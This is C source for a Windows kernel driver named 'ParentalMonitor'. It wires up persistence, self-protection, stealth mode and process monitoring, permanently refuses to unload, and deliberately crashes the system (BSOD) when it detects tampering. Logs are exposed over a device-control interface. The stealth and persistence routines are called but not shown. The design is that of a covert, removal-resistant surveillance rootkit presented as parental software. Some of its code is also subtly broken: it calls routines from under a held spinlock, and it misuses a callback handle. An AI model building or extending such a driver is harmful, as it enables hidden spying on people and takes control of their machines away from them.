#include "core.h"
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

// Global context
static PDRIVER_CONTEXT g_DriverContext = NULL;
static KSPIN_LOCK g_ContextLock;

// Driver Entry - This is where everything starts
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status = STATUS_SUCCESS;
    
    DbgPrint("[ParentalMonitor] DriverEntry called\n");
    
    // Initialize spin lock
    KeInitializeSpinLock(&g_ContextLock);
    
    // Initialize driver context
    status = InitializeDriverContext(DriverObject, RegistryPath);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Failed to initialize context: 0x%X\n", status);
        return status;
    }
    
    // Create device for communication
    status = CreateDevice(DriverObject);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Failed to create device: 0x%X\n", status);
        CleanupDriverContext();
        return status;
    }
    
    // Set IRP handlers
    SetIrpHandlers(DriverObject);
    
    // Establish persistence
    status = EstablishPersistence();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Warning: Persistence setup failed: 0x%X\n", status);
    } else {
        DbgPrint("[ParentalMonitor] Persistence established\n");
    }
    
    // Enable self-protection
    status = EnableSelfProtection();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Warning: Self-protection setup failed: 0x%X\n", status);
    } else {
        DbgPrint("[ParentalMonitor] Self-protection enabled\n");
    }
    
    // Enable stealth mode
    status = EnableStealthMode();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Warning: Stealth mode setup failed: 0x%X\n", status);
    } else {
        DbgPrint("[ParentalMonitor] Stealth mode enabled\n");
    }
    
    // Start monitoring thread
    status = StartMonitorThread();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] Warning: Monitor thread failed: 0x%X\n", status);
    }
    
    // Set driver unload routine (but we'll prevent actual unload)
    DriverObject->DriverUnload = ControlledDriverUnload;
    
    // Record installation time
    KeQuerySystemTime(&g_DriverContext->InstallTime);
    
    DbgPrint("[ParentalMonitor] Driver loaded successfully at %lld\n", 
             g_DriverContext->InstallTime.QuadPart);
    
    return STATUS_SUCCESS;
}

// Initialize driver context
NTSTATUS InitializeDriverContext(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    PDRIVER_CONTEXT context = NULL;
    
    // Allocate non-paged memory for context
    context = (PDRIVER_CONTEXT)ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(DRIVER_CONTEXT),
        DRIVER_TAG
    );
    
    if (!context) {
        DbgPrint("[ParentalMonitor] Failed to allocate context memory\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Zero out the context
    RtlZeroMemory(context, sizeof(DRIVER_CONTEXT));
    
    // Store basic information
    context->DriverObject = DriverObject;
    context->RegistryPath.MaximumLength = RegistryPath->MaximumLength;
    context->RegistryPath.Length = RegistryPath->Length;
    context->RegistryPath.Buffer = ExAllocatePoolWithTag(
        NonPagedPoolNx,
        RegistryPath->MaximumLength,
        DRIVER_TAG
    );
    
    if (!context->RegistryPath.Buffer) {
        ExFreePoolWithTag(context, DRIVER_TAG);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    RtlCopyUnicodeString(&context->RegistryPath, RegistryPath);
    
    // Initialize lists and locks
    InitializeListHead(&context->PersistenceList);
    KeInitializeSpinLock(&context->PersistenceLock);
    ExInitializeRundownProtection(&context->ProtectionRundown);
    KeInitializeEvent(&context->MonitorEvent, NotificationEvent, FALSE);
    
    // Set default configuration
    context->ConfigFlags = CONFIG_PERSISTENT | CONFIG_SELF_PROTECT | 
                          CONFIG_STEALTH | CONFIG_MONITOR_PROCESS;
    
    // Store in global
    g_DriverContext = context;
    
    return STATUS_SUCCESS;
}

// Create device for communication
NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING deviceName, symlinkName;
    
    // Create device name
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
    
    // Create device
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }
    
    // Store in context
    if (g_DriverContext) {
        g_DriverContext->DeviceObject = deviceObject;
    }
    
    // Create symbolic link
    status = IoCreateSymbolicLink(&symlinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[ParentalMonitor] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }
    
    // Set device flags
    deviceObject->Flags |= DO_DIRECT_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    
    return STATUS_SUCCESS;
}

// Set IRP handlers
VOID SetIrpHandlers(PDRIVER_OBJECT DriverObject)
{
    // Set default handler
    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = DefaultIrpHandler;
    }
    
    // Set specific handlers
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    DriverObject->MajorFunction[IRP_MJ_CLEANUP] = DispatchCleanup;
    
    // Fast I/O dispatch (optional)
    DriverObject->FastIoDispatch = NULL;
}

// Controlled unload (will prevent actual unload)
VOID ControlledDriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    
    DbgPrint("[ParentalMonitor] Unload attempt detected!\n");
    
    // Check if unload is allowed (only from our own control)
    if (!IsUnloadAllowed()) {
        DbgPrint("[ParentalMonitor] Unload denied - driver is protected\n");
        
        // Option 1: Simply return without unloading
        // Option 2: Trigger BSOD if tampering is detected
        if (CheckForTampering()) {
            DbgPrint("[ParentalMonitor] Tampering detected! Triggering protection...\n");
            TriggerBSODIfTampered();
        }
        
        return;
    }
    
    // Only unload if explicitly allowed
    DbgPrint("[ParentalMonitor] Controlled unload initiated\n");
    CleanupDriverContext();
}

// Default IRP handler
NTSTATUS DefaultIrpHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

// Dispatch create
NTSTATUS DispatchCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

// Dispatch close
NTSTATUS DispatchClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

// Dispatch device control (for communication)
NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR information = 0;
    
    switch (irpStack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_GET_STATUS:
            // Return driver status
            information = sizeof(DRIVER_STATUS);
            status = GetDriverStatus((PDRIVER_STATUS)Irp->AssociatedIrp.SystemBuffer);
            break;
            
        case IOCTL_SET_CONFIG:
            // Update configuration
            information = sizeof(CONFIG_UPDATE);
            status = UpdateConfiguration((PCONFIG_UPDATE)Irp->AssociatedIrp.SystemBuffer);
            break;
            
        case IOCTL_GET_LOGS:
            // Return activity logs
            information = MAX_LOG_SIZE;
            status = GetActivityLogs((PACTIVITY_LOG)Irp->AssociatedIrp.SystemBuffer);
            break;
            
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
    
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = information;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

// Cleanup everything
VOID CleanupDriverContext(VOID)
{
    KIRQL oldIrql;
    
    if (!g_DriverContext) {
        return;
    }
    
    // Acquire lock
    KeAcquireSpinLock(&g_ContextLock, &oldIrql);
    
    // Stop monitoring thread
    if (g_DriverContext->MonitorThread) {
        KeSetEvent(&g_DriverContext->MonitorEvent, 0, FALSE);
        // Wait for thread to exit (simplified)
    }
    
    // Remove callbacks
    if (g_DriverContext->ProcessNotifyHandle) {
        PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_DriverContext->ProcessNotifyHandle, TRUE);
    }
    
    // Remove persistence
    RemovePersistence();
    
    // Disable protection
    DisableSelfProtection();
    
    // Disable stealth
    DisableStealthMode();
    
    // Free registry path
    if (g_DriverContext->RegistryPath.Buffer) {
        ExFreePoolWithTag(g_DriverContext->RegistryPath.Buffer, DRIVER_TAG);
    }
    
    // Free context
    ExFreePoolWithTag(g_DriverContext, DRIVER_TAG);
    g_DriverContext = NULL;
    
    // Release lock
    KeReleaseSpinLock(&g_ContextLock, oldIrql);
    
    DbgPrint("[ParentalMonitor] Context cleaned up\n");
}

// Get driver context
PDRIVER_CONTEXT GetDriverContext(VOID)
{
    return g_DriverContext;
}

// Check if unload is allowed
BOOLEAN IsUnloadAllowed(VOID)
{
    // Only allow unload if:
    // 1. It's coming from our own control application
    // 2. Or we're in a special debug mode
    
    // For now, always deny (we'll implement proper checks later)
    return FALSE;
}